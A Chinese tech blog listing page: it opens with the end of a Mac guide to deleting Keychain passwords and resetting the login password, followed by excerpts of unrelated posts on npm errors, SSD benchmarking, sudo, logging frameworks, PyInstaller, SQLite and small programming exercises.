在Mac上删除已保存的密码 在本文的前面各节中，我们介绍了如何在“钥匙串”中更改密码。如果您还想知道如何从Mac删除密码，请继续阅读。我们将展示如何使用官方应用程序自行清除所有密码。
在Mac上打开“钥匙串访问”应用程序。
现在转到“类别”部分，然后选择“密码”。在这里，您将找到Mac上存储的所有密码。例如，如果要删除Mail应用程序的已保存密码，请选择适当的字段→右键单击它，然后选择Delete。
再次单击“删除”按钮，确认提示通知。电子邮件凭证将被清除。
再次尝试输入密码时，系统会要求您再次输入密码。这意味着您已成功删除密码。
通过执行上述步骤，您可以轻松更改并删除不需要的已保存密码。当您将Mac借给您不太信任的人时，此选项也可能很方便，以确保他无法访问您使用的服务。
在Mac上更改密码 您可能要为用户登录和钥匙串访问使用不同的密码。幸运的是，您可以随时更改它。我们将显示在Mac上重置用户密码的步骤。
通过用户和组首选项更改密码 此选项仅适用于知道其旧密码并且只想将其更新为新密码的用户。
转到系统偏好设置→用户和组→在左侧选择您的用户名→然后单击右侧的更改密码按钮。
填写必填字段，然后单击蓝色的更改密码按钮进行确认。
通过重置并使用另一个管理员帐户来更改Mac密码 如果您知道Mac上另一个帐户的用户名和密码，则可以使用它来更新密码。为此，请执行以下步骤：
登录另一个帐户。
转到系统偏好设置→用户和组。
单击锁定符号，然后输入密码以进行更改。
选择您要更改的用户名，然后单击“重置密码”按钮。
填写必填字段并确认重置。
然后注销Mac并尝试使用新密码登录。
通过Apple ID更改密码 由于Apple早在OS X Lion中就实现了此功能，因此所有Mac用户现在都可以使用其Apple ID来恢复其密码。此方法的说明很简单：在屏幕上可以选择要登录的用户帐户后，在密码字段中多次输入您可以想到的短语。如果您继续这样做，它将为您提供一种以这种方式恢复密码的选项。然后按照Apple的指示恢复密码。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5b2de7f6aa34237cf97ba16deca5c145/" rel="bookmark">
			MarkDown 学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MarkDown 学习 #+空格 为一级标题
##+空格 为二级标题
字体 hello word * +内容+ * 斜体
hello word ** +内容+ ** 加粗
hello word * * * +内容+ * * * 斜体加粗
helloword ~~ + 内容 + ~~ 摒弃内容
序号 ab a
c
分割线 分割线（— 或 ***）
表格 名称性别出生日期张三男1997-01-01 超链接 点击跳转bilili
插入图片 引用 文章参考csdn 狂神说Java
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a6aab8f6f8397c1dbccd43bc33244f9/" rel="bookmark">
			＞ fsevents@1.2.13 install /Users/shenyuming/Desktop/FinancialPortrait/financial_portrait/node_module
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&gt; fsevents@1.2.13 install /Users/shenyuming/Desktop/FinancialPortrait/financial_portrait/node_modules/fsevents
&gt; node install.js
gyp ERR! configure error gyp ERR! stack Error: EACCES: permission denied, mkdir '/Users/shenyuming/Desktop/FinancialPortrait/financial_portrait/node_modules/fsevents/build'
gyp ERR! System Darwin 18.7.0
gyp ERR! command "/usr/local/bin/node" "/usr/local/lib/node_modules/npm/node_modules/node-gyp/bin/node-gyp.js" "rebuild"
gyp ERR! cwd /Users/shenyuming/Desktop/FinancialPortrait/financial_portrait/node_modules/fsevents
gyp ERR! node -v v12.18.3
gyp ERR! node-gyp -v v5.1.0
gyp ERR! not ok &gt; chromedriver@2.46.0 install /Users/shenyuming/Desktop/FinancialPortrait/financial_portrait/node_modules/chromedriver
&gt; node install.js
/Users/shenyuming/Desktop/FinancialPortrait/financial_portrait/node_modules/chromedriver/2.46/chromedriver is not writable: EACCES: permission denied, mkdir '/Users/shenyuming/Desktop/FinancialPortrait/financial_portrait/node_modules/chromedriver/2.46'
/Users/shenyuming/Desktop/FinancialPortrait/financial_portrait/node_modules/chromedriver/2.46/chromedriver is not writable: EACCES: permission denied, mkdir '/Users/shenyuming/Desktop/FinancialPortrait/financial_portrait/node_modules/chromedriver/2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1a6aab8f6f8397c1dbccd43bc33244f9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/777e5e1c6af021302a97e48e4e3198ee/" rel="bookmark">
			SSD性能怎么测？看这一篇就够了！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转载自：https://www.sohu.com/a/390625596_505795
一、概述
自从很多年前开始做SSD方面的测试以来，我就和某些行业工作者产生了同感：存储性能测试基本是所有计算机硬件测试里最复杂困难的一项。存储系统的性能受到整个机器其他硬件甚至软件方面的影响：按ssd本身来说，在不同负载（线程数，队列深度，块大小，随机度等）环境下一块盘发挥出的性能大有区别，设置成不同扇区大小性能会不同，在相同情况下测试一段时间盘的性能还会发生FOB-transition-steadystate的转变；按软件环境来说，不同系统、文件系统以及软件本身的访问模式都能造成性能差别；另外其他硬件比如CPU和控制器、阵列卡等也可能影响SSD的性能。因此在测试方法上的研究层出不穷，甚至有行业组织给出测试建议（如SNIA的Solid State Storage Performance Test Specification）。
也正是因为这种复杂性，各种不做SSD的人，比如操作系统、数据库、磁盘控制器（HBA和阵列卡）甚至CPU/FPGA制造商都在为存储性能贡献力量。近几年各种诸如基于GPU、FPGA数据中心以及NDP（近数据处理）的新方案也层出不穷。
本文主要测试的就是这些“SSD本身性能以外”的部分，通过在不同软硬件环境下对多块SSD进行测试，看看系统的硬件平台、操作系统和文件系统对SSD性能的影响，同时对目前几个存储测试工具进行评测，以验证它们的测试方法和生成的结果的可靠性。
二、常见误区
在开始测试之前，我们先纠正一些认识上的误区。
1. 操作系统、文件系统（分区格式化）对SSD性能影响很小甚至与其无关
其实曾经有个阿里的技术员就是因为忽视这个关系导致犯了很大错误被开除，甚至业界曾经因为这个问题出过一场风波。简单的看，你使用软件在读写磁盘数据时，系统会先下指令，文件系统会找到对应的LBA（逻辑地址），经过协议、驱动层到SSD主控，主控又会通过映射表将LBA转换成PBA（物理地址），从而对SSD颗粒上的数据进行读写。具体过程网上和书本里很多这方面介绍，这里就不赘述了。我们要知道的是，这其中每一环都会产生延迟损耗。
在十几年前，我们可以说这种损耗相对于普通的碟片存储和早期SSD来说基本可以忽略不计。但是随着硬件的发展，存储设备的性能上升了几个数量级，于是这些软件的部分越来越不可以忽略，甚至开始争夺性能的主导影响因素。一个比较极端的例子就是，傲腾内存Optane DCPM在内存模式下延迟在200-300ns之间，但是在块设备模式下驱动成磁盘的话，延迟就是微秒级了。下图就是一个大概的影响因素的统计，应该是linux下，因为后文测试中win下影响更大。这也是人们不断开发引入更高效的新文件系统的原因之一。
但是事情真的只是一个固定overhead这么简单么？事实并不是这样。实际上初始化格式化以后，SSD甚至整个存储系统的性能特性可能会发生很大的变化，不同文件系统下的磁盘性能也有很大差别。这就是上面阿里当年引进的SM843T彻底翻车的原因。还有过别人买了很多片840pro进行测试，结果如下图。通过个人测过的几十片SSD的经验来看，实际上CPU占用、CPU内存延迟、SSD的内部调度等方面都能影响硬盘的实际性能。要彻底弄清基本不可能，因为涉及到各家闭源的固件策略，所以我们只能而且必须要在测试时注意。
2. 裸盘（RAW）不格式化直接测试出的性能=存储设备的真实性能
这个观点有2个问题：
① 文件系统和操作系统对性能可能有很大影响，上面已经详细说明不再赘述。对于一般人，一块硬盘给你，你不格式化又怎么使用呢？格式化写入文件的测试方式和裸盘直接跑哪个更能反映实际使用的方式和过程，哪个对于大部分用户更真实，一目了然。
当然经过调查也发现部分数据库软件也有支持裸盘操作，但是因为管理繁琐，安全性未知，甚至有手册建议不要用裸盘存重要数据。而且一般同样要建立一个raw分区，而且要实现日志之类功能仍然是殊途同归。再加上现在的文件系统很多都支持directIO操作可以绕过缓存策略等影响因素，所以裸磁盘的应用面限制很大。
② 测SSD的一个大忌就是不进行preconditioning，也就是测试前不先写入好被测试数据就对其进行测试。这不只是有些影响因素没测到的问题了，整个测试都可能掉进SSD的“行为陷阱”里。前几天和一个测试软件的开发者讨论了这个事情，基本把这个错误做法可能产生的问题整个列举了一遍。详细讨论过程在此：https://github.com/microsoft/diskspd/issues/131。
大概总结一下，如果你不做preconditioning的话，直接拿来测或者测了没有写入到的地方，SSD的FTL可能仍然没有把颗粒上的这块空间标记为写入过，结果就是测试根本没有落盘（即没有读写到存储介质本身），硬盘闭着眼反馈00或者FF，直接在主控里解决了。甚至如果preconditioning做的不好的话，SSD仍然可能找出规律使得测试结果出错。目前已知有2个人因为这个问题测出了远高于SSD性能标称的数值，另一个在这：https://github.com/microsoft/diskspd/issues/129
对于不能访问github的人，引用一下上述讨论的重点：
What's probably happening is that the SSD has had very little data written to it (relative to capacity) since it was last cleared and the device can optimize away reading the SSD's NAND since it knows it hasn't been written - it just returns zeroes.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/777e5e1c6af021302a97e48e4e3198ee/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fc3d6d83898423dbc7295d93523678bd/" rel="bookmark">
			Sudo: unable to initialize policy plugin 解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在centos7下，使用sudo 命令对www用户生成ssh秘钥，结果报错如下：
Sudo: parse error in /etc/sudoers near line 125 Sudo: no valid sudoers sources found, quitting Sudo: unable to initialize policy plugin 中文翻译
Sudo：解析第125行附近的 /etc/sudoers 中的错误
Sudo：找不到有效的sudoers来源，正在退出
Sudo：无法初始化策略插件
解决方法 只需要先执行如下命令：
yum remove sudo yum install sudo 再执行：sudo 命令对www用户生成ssh秘钥就可以了！
参考链接 ：
Sudo: unable to initialize policy plugin 解决方法:
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/51b37e16f5587f1b4fcbeb94b749342a/" rel="bookmark">
			Logback和Log4j详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 日志框架前言 一、日志简介1、什么是日志？2、日志的用途？ 二、常用的日志框架1、日志门面2、logback（更快的执行速度使其成为主流）2.1 引入依赖2.2 编写xml文件2.3 测试用例2.4组件详解2.4.1 appender1、ConsoleAppender：输出到控制台2、FileAppender：输出到文件3、RollingFileAppender：轮转输出到文件4、DBAppender：输出到数据库 2.4.2 logger 3、log4j 三、项目实战1、项目日志打印2次的问题2、通过类创建的logger对象打印不出日志3、按级别分文件输出4、 日志框架的迁移 四、日志规范1、Logger对象的声明和初始化2、 不得使用System.out, System.err进行日志记录，请改使用logger.debug、logger.error3、 使用参数化形式`{}`占位4、 输出不同级别的日志5、没有输出全部错误信息6、不要在千层循环中打印日志7、 什么时候输出日志7.1 异常捕获处7.2 调用外部接口处7.3 关键操作 五、日志分析、存储、展示1、ELK简介2、ELK工作原理 日志框架 前言 ​ 在程序中写日志是一件非常重要，但是很容易被开发人员忽视的事情。程序中好的日志可以帮助我们大大减轻后期维护压力。在实际的工作中，开发人员往往迫于巨大时间压力，而写日志又是一个非常繁琐的事情，往往没有引起足够的重视。开发人员应在一开始就养成良好的日志撰写习惯，并且应在实际的开发工作中为写日志预留足够的时间。
一、日志简介 1、什么是日志？ 简单的说，日志就是记录程序的运行轨迹，方便查找关键信息，也方便快速定位解决问题。
2、日志的用途？ 记录用户操作的审计日志，甚至有的时候就是监管部门的要求
快速定位问题的根源
追踪程序执行的过程
追踪数据的变化
数据统计和性能分析
采集运行环境数据
一般在程序上线之后，一旦发生异常，第一件事就是要弄清楚当时发生了什么。用户当时做了什么操作，环境有无影响，数据有什么变化，是不是反复发生等，然后再进一步的确定大致是哪个方面的问题。确定是程序的问题之后再交由开发人员去重现、研究、提出解决方案。这时，日志就给我们提供了第一手的资料。
二、常用的日志框架 1、日志门面 日志门面其实就是日志框架的接口，不同的日志框架可以实现同一个框架接口，在我们更换日志框架的时候只要换了jar包就行。遵循了设计原则中的依赖倒置原则。
常见的日志门面：slf4j（主流）、commons-logging
slf4j的实现框架：log4j和logback
日志级别：TRACE, DEBUG, INFO, WARN, ERROR，遵循就近原则。
注：我们在项目中导入包的时候一定要导入日志门面对应的接口类，不要使用实现类。[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-0nCr01BZ-1603758455711)(C:\Users\smilevers\AppData\Roaming\Typora\typora-user-images\image-20201009095946899.png)] 2、logback（更快的执行速度使其成为主流） 推荐阅读官方文档：[](http://www.logback.cn/02%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%9E%B6%E6%9E%84.html
2.1 引入依赖 &lt;!--slf4j统一日志接口依赖包--&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt; &lt;version&gt;1.7.5&lt;/version&gt; &lt;/dependency&gt; &lt;!--logback依赖包--&gt; &lt;dependency&gt; &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt; &lt;artifactId&gt;logback-core&lt;/artifactId&gt; &lt;version&gt;1.1.7&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt; &lt;artifactId&gt;logback-classic&lt;/artifactId&gt; &lt;version&gt;1.1.7&lt;/version&gt; &lt;/dependency&gt; 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/51b37e16f5587f1b4fcbeb94b749342a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e6e007fcab1c7c70e13ae712c09102c/" rel="bookmark">
			qq自定义diy名片代码复制_DIY 你的专属酷炫照片投影灯
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文转自：DF创客社区 - 分享创造的喜悦
作者：好奇吖斌
原文链接（原文下方提供相关下载文件）：
DIY 你的专属酷炫照片投影灯-创意生活论坛-DF创客社区​mc.dfrobot.com.cn 本文要讲的照片投影灯呢，就是一盏可以将你的照片做成一个灯罩，灯罩上用密密麻麻的点，来组成你的照片的样子，然后利用点光源照射，光线就通过了这些点，在墙壁上投影出你的照片。DIY 你的专属酷炫照片投影灯-创意生活论坛-DF创客社区本文要讲的照片投影灯呢，就是一盏可以将你的照片做成一个灯罩，灯罩上用密密麻麻的点，来组成你的照片的样子，然后利用点光源照射，光线就通过了这些点，在墙壁上投影出你的照片。
废话不多说，大家看一下效果就知道了：
没错，照片上就是本人啦，虽然长得有点抽象，哈哈哈。
当然这也不是我的原创啦，看到好多人都做过这个，
前两天跟好奇吖斌
交流，发现他也做过类似的：
3D打印球型投影小夜灯-3种生成方法超详细教程-创意生活论坛-DF创客社区​mc.dfrobot.com.cn http://mp.weixin.qq.com/s/OrpgmgE66sAv9OU3v_DuHQ，只不过他好像是用犀牛软件做的，犀牛我不会哈，太专业了。这个有好几种方法做，最近他也在整理教程，到时候大家可以去他那边看看。3D打印球型投影小夜灯-3种生成方法超详细教程-创意生活论坛-DF创客社区http://mp.weixin.qq.com/s/OrpgmgE66sAv9OU3v_DuHQ，只不过他好像是用犀牛软件做的，犀牛我不会哈，太专业了。这个有好几种方法做，最近他也在整理教程，到时候大家可以去他那边看看。
另外，国外大神也在 Thingiverse 上分享过照片投影灯的做法，我大部分都是参考了这位大神的链接做的。
下面就来正式介绍怎么做啦，过程非常简单哦，绝对没有你想象的那么复杂~
## 准备工作
首先你得有一台电脑（这不是废话嘛），但是最好有8G及以上内存。
然后去下载一个软件：OpenSCAD:http://www.openscad.org/，这是一个开源的参数化建模软件，要用代码建模。啊？要写程序啊？可是我不会这个怎么办？
别担心，国外大神Volker Schuller已经帮我们把照片投影灯的程序写好啦，你要做的只需要下载这个软件就好啦~
这里推荐下载最新的开发版本，因为稳定版已经好久没更新了，好像功能、性能之类的一直没跟上：
下载安装完之后，准备工作就做完啦~哦对了，你还得下载文末的程序。
## 照片投影灯设计
接下来就正式介绍我们的照片投影灯的设计环节啦。
选择一张你心仪的照片，最好色彩分明，背景干净些的。然后将照片裁剪成方形，并将照片的大小设置为 85*85 pixel，当然，你也可以按照自己的喜好设置大小，设置成85的话，你就可以不用修改程序啦，适合小白，大神请忽略~我这是在 Mac 上设置的，Windows 上怎么设置，我也没用过，大家可以自己设置一下，也可以在评论里 po 一下方法。
然后打开这个网站：http://jsfiddle.net/jarvis_chan/v17rtjtk/，将你的照片导入
然后，你会发现你的照片变成了一串数字！这个就是你的照片的编码啦~记得复制这传数字！
接着用 OpenSCAD 软件打开附件中的程序，将上面那串数字，粘贴在 image 变量里。
如下图所示。然后点击箭头2处，预览一下，大概需要几十秒。接着点击箭头3处，渲染模型，这个时候大家可以去喝一杯茶，慢慢等待了，我的电脑大概渲染了30分钟，然后你就可以看到你的照片投影灯灯罩的模型啦~
最后，点击箭头4的地方，写着 STL 的，你就可以将你的灯罩模型保存为 STL 格式啦，方便后面打印。
当然这个程序里面有很多你可以自定义的参数，你可以可以修改试试看。
本来附件的程序，也能生成底座的，但是我觉得生成的底座不符合我的要求，或者我觉得还不够好吧，就自己设计一下，附件中也同样提供了大家下载~
## 3D 打印与安装
打印就不展开了，大家将灯罩和底座打印好就行。
下图是制作这个投影灯的所有材料：
3D 打印灯罩3D 打印底座大功率LED热缩管（就是那两段短短的小黑管啦）USB 电源线防止做广告的嫌疑，我就不 po 购买链接了，有需要的私信我好了。 安装也很简单，大家看图就好。
将LED嵌入底座：
将 LED 与 USB 电源线焊接在一起：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9e6e007fcab1c7c70e13ae712c09102c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a3ecb4e102c5a353a269fa6cd8659203/" rel="bookmark">
			分治算法：芯片检测问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		芯片检测问题 一、问题描述二、问题分析三、算法代码 一、问题描述 有n片芯片，其中好芯片比坏芯片至少多1片，现需要通过测试从中找出1片好芯片。测试方法是:将2片芯片放到测试台上，2片芯片互相测试并报告测试结果:“好”或者“坏”。假设好芯片的报告是正确的，坏芯片的报告是不可靠的 (即对于被测试的芯片显示的报告可能是坏或者好）。请设计一个算法，使用最少的测试次数来找出1片好芯片。
测试函数可以采用以下方法。
#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;time.h&gt; //建立测试函数，参数i表示主动测试芯片， iB表示被测芯片.返回值为被测芯片的测试值 //值为1时表示好芯片，为0时表示坏芯片. //应用随机数来表示不确定的值1、0.注意:在主函数中加上随机数种子语句srand(time(NULL)); //算法的输入可以用数组表示，比如:ABc[17]={1,0,0,1,1,1,0,0,1,1,1,1,0,1,0,0,0} 表示17个芯片，其中9片好芯片、8片坏芯片。 int X_test(int iA,int iB) { if(iA==1) return iB; return rand()%2; } 二、问题分析 本问题采用的主要思想是分治策略。将n片芯片两两一组分成 ⌊ n 2 ⌋ ⌊\frac n 2⌋ ⌊2n​⌋ (向下取整) 组，每组测试1次，通过第一轮的 ⌊ n 2 ⌋ ⌊\frac n 2⌋ ⌊2n​⌋ 的测试淘汰一部分芯片，剩下的芯片构成一个规模较小的子问题进入第二轮。如果测试的芯片不超过3片 (即子问题规模小于等于3) ，并且好芯片比坏芯片至少多1片，那么只要测试1次就可以找出好芯片。
而上面所说的淘汰规则需要符合好芯片比坏芯片至少多1片的条件，所以采用的淘汰规则是：
结果是情况1(下图)时，那么A、B中留1片，丢掉1片；如果时后三种情况，则把A和B全部丢掉。（在此不做证明）
情况A报告B报告结论1B是好的A是好的A，B都好或A，B都坏2B是好的A是坏的至少1片是坏的3B是坏的A是好的至少1片是坏的4B是坏的A是坏的至少1片是坏的 具体算法思想步骤：
1、芯片数 n 等于2时，根据前面提的条件两片必然是好芯片，任取一片即可。
2、芯片数 n 等于3时 (两好一坏)，任取两片芯片做测试，若是情况2或3，没测的那个芯片必定时好芯片；若是其他情况，两个被测芯片必然是好芯片，则任取一片被测芯片即可。
3、芯片数 n 大于3时，分为两种情形i。n 为偶数时，芯片两两测试比较，在结果为情况1中取出一片另放，以便后续继续比较，若结果是情况2或3或4的都舍去(就是上面的淘汰规则)。n 为奇数时，取出一片芯片，然后将该芯片和其余的芯片进行一一比较，若比较结果为情况1的次数 &gt; n 2 &gt; \frac n 2 &gt;2n​,则该芯片为好芯片，反之则为坏芯片，将坏芯片删除后；(此时芯片数为偶数) 接着又回到上面说的 n 为偶数的情形。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a3ecb4e102c5a353a269fa6cd8659203/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/205ba1783c17541fc25af78f8cf8df7d/" rel="bookmark">
			map转换成JSON的3种方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. alibaba &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.41&lt;/version&gt; &lt;/dependency&gt; JSONUtils.toJSONString(requestMap);
2. json-lib &lt;dependency&gt; &lt;groupId&gt;net.sf.json-lib&lt;/groupId&gt; &lt;artifactId&gt;json-lib&lt;/artifactId&gt; &lt;version&gt;2.5&lt;/version&gt; &lt;/dependency&gt; JSONObject jsonObject = JSONObject.fromObject(map);
String result = jsonObject.toString();
3. google &lt;dependency&gt; &lt;groupId&gt;com.google.code.gson&lt;/groupId&gt; &lt;artifactId&gt;gson&lt;/artifactId&gt; &lt;version&gt;2.3.1&lt;/version&gt; &lt;/dependency&gt; new Gson().toJson(param);
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/425b772711d6dfd297a194c0596979df/" rel="bookmark">
			练习4-7 求e的近似值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 自然常数 e 可以用级数 1+1/1!+1/2!+⋯+1/n!+⋯ 来近似计算。本题要求对给定的非负整数 n，求该级数的前 n+1 项和。
输入格式: 输入第一行中给出非负整数 n（≤1000）。
输出格式: 在一行中输出部分和的值，保留小数点后八位。
#include&lt;stdio.h&gt; int main(void){ int i,n; double sum,j;//1000!超过了整数的最大范围 j=sum=1; scanf("%d",&amp;n); for(i=1;i&lt;=n;i++){ j*=i; sum+=1.0/j; } printf("%.8f\n",sum); } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e728808c47a4a2bc357e2c3f2297477b/" rel="bookmark">
			Uncaught TypeError: Cannot read property ‘forEach‘ of undefined  React相关报错原因
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		运行React框架时，浏览器报错 Uncaught TypeError: Cannot read property ‘forEach’ of undefined
可能是谷歌浏览器插件开启的原因，如图：
关闭该插件，重新刷新页面即可
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01f372592250ba125624a986f0860a5f/" rel="bookmark">
			pyinstaller打包exe程序步骤和添加依赖文件方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		hello，各位骚年，大家好，我是骚强，或许我们并不是专业的程序猿，但是却可以通过python来提高我们的工作效率，减少加班时间，让代码替我们完成一些重复的工作，节省下来的时间去泡个妹子，牵牵小手不香吗 话不多说，马上进入本次pyinstaller打包工具知识分享，隔壁家小东女朋友叫我待会一起去吃饭呢。。。。。
1、安装pyinstaller库 命令行输入以下命令，如图显示是我已经装过了：
pip install pyinstaller 2、pyinstaller的打包机制： python脚本的运行离不开python解释器，把脚本打包成exe可执行文件时，pyinstaller会将python解释器和脚本一起打包，同时把需要用到的第三方库和依赖包一并打入到exe文件中，下面我就以最近写的一款装包工具为例，简述一下我的打包过程。
3、打包命令： pyinstaller-F [main.py] 这条命令指的是将以main.py为主程序的脚本打包为单独一个exe文件，-F参数表示覆盖打包，无论打多少次包都会是最新的。你可以选择cmd命令行进行操作，也可以使用pycharm的Terminal端口进行，我使用的是Terminal。如图。
运行完毕后，会看到build，dist，和.spec文件生成。dist里面的exe文件就是刚刚生成的可执行文件，这样简单快捷的打包就完成啦。
4、添加导包外的一些依赖文件。 像第3步这种情况是程序中不需要依赖外部文件的，假如程序逻辑中需要依赖一些文件，但pyinstaller并不会将自动把这些文件帮你打包进去，比如，一个第三方库中有一段程序需要去使用public.xml文件，当打包完成后，这个文件是不会自动打包进去的，那该怎么办呢？
别急，pyinstaller为我们提供了参数配置文件，也就是刚刚生成的.spec文件，我们只需要再datas中配置需要打包的文件即可，比如
datas=[('D:\\python3.6.5\\Lib\\site-packages\\androguard\\core\\resources\\public.xml','androguard\\core\\resources') 表示的是将public.xml文件打包到androguard\core\resources目录下
其他的一些参数配置请自行百度，如有时需要让pyinstaller不打包某些用不到的模块，可通过在excludes=[]中添加此模块实现，如excludes=[‘xxx’]。
5、.spec方式打包： 这样修改后我们就可以使用命令进行再次打包啦，打包完成后打开软件，发现需要用到依赖文件已经成功打包，相关功能就正常啦。
pyinstaller -D xxx.spec 6、pyinstaller常用参数 另外，骚强也是整理了一下pyinstaller的常用参数，有兴趣可以试一试哦，坑已经准备好了，各位勇士快来踩一踩
-F, –onefile 打包一个单个文件，如果你的代码都写在一个.py文件的话，可以用这个，如果是多个.py文件就别用 -D, –onedir 打包多个文件，在dist中生成很多依赖文件，适合以框架形式编写工具代码，我个人比较推荐这样，代码易于维护 -K, –tk 在部署时包含 TCL/TK -a, –ascii 不包含编码.在支持Unicode的python版本上默认包含所有的编码. -d, –debug 产生debug版本的可执行文件 -w,–windowed,–noconsole 使用Windows子系统执行.当程序启动的时候不会打开命令行(只对Windows有效) -c,–nowindowed,–console 使用控制台子系统执行(默认)(只对Windows有效) pyinstaller -c xxxx.py pyinstaller xxxx.py --console -s,–strip 可执行文件和共享库将run through strip.注意Cygwin的strip往往使普通的win32 Dll无法使用. -X, –upx 如果有UPX安装(执行Configure.py时检测),会压缩执行文件(Windows系统中的DLL也会)(参见note) -o DIR, –out=DIR 指定spec文件的生成目录,如果没有指定,而且当前目录是PyInstaller的根目录,会自动创建一个用于输出(spec和生成的可执行文件)的目录.如果没有指定,而当前目录不是PyInstaller的根目录,则会输出到当前的目录下. -p DIR, –path=DIR 设置导入路径(和使用PYTHONPATH效果相似).可以用路径分割符(Windows使用分号,Linux使用冒号)分割,指定多个目录.也可以使用多个-p参数来设置多个导入路径，让pyinstaller自己去找程序需要的资源 –icon= 将file.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/01f372592250ba125624a986f0860a5f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/966e1817cff96f99ddd575a834bb0191/" rel="bookmark">
			canvas绘制不规则图形，点击获取当前图形索引
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		canvas给不规则图形添加点击事件 有这么一个需求，把传过来的四个坐标，连成一个图形（可能是规则的，也可能是不规则的），点击某个图形，显示当前这个图形的信息
//数据格式 dataList: { lonLatList: null seatId: 1	//图形id state: 0	//状态 vehicleNo: null	//车牌号 xyList: [	//根据经纬度转换的xy坐标 [58, 511], [81, 503], [23, 462], [0, 470], [58, 511] ] } 因为canvas的y坐标是向下的，所以拿到数据后先翻转y坐标
polygons = polygonsInversionY(dataList.map(item =&gt; { const list = item.xyList const len = list.length // 如果首尾是同一个结点，则去掉尾结点 if (list.length &gt; 1) { const lastIndex = list.length - 1 if (list[0][0] === list[lastIndex][0] &amp;&amp; list[0][1] === list[lastIndex][1]) { return list.filter((_, index) =&gt; index &lt; lastIndex) } } return list })) drawPolygons = polygons 翻转后的坐标 根据翻转之后的坐标开始绘图 效果图 图形绘制完毕，添加点击功能，点哪个显示哪个的信息 Mycanvas.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/966e1817cff96f99ddd575a834bb0191/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1d4d0a3a64aa490962afb81f77834b2a/" rel="bookmark">
			SQLITE语法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、基本语法 创建数据库 : create database basename
删除数据库 : drop database dbname
创建新表 : create table tablename(col1 type1 [not null] [primary key],col2 type2 [not null],..)
创建相似表 :
1：create table tab_new like tab_old (使用旧表创建新表)
2：create table tab_new as select col1,col2… from tab_old definition only
删除新表 : drop table tabname 增加一个列 : Alter table tabname add column type
添加主键：Alter table tabname add primary key(col) 删除主键：Alter table tabname drop primary key(col) 创建索引：create [unique] index idxname on tabname(col….
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1d4d0a3a64aa490962afb81f77834b2a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f9c739243bec8308c311c6728c514546/" rel="bookmark">
			Egg开发项目实践纪实
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		博客版文档在线阅读地址：egg开发实践文档-by山岚
Egg开发实践文档 目前项目中 Node.js 的需求是越来越多，简单的内部系统、Socket 通信服务、官网等，开发难度也越来越大，而 Egg.js 就是一款解决企业级开发问题的 Node.js 框架。
web服务端框架背景介绍 市面主要流行的有Express、Koa2、Egg、NextJs等
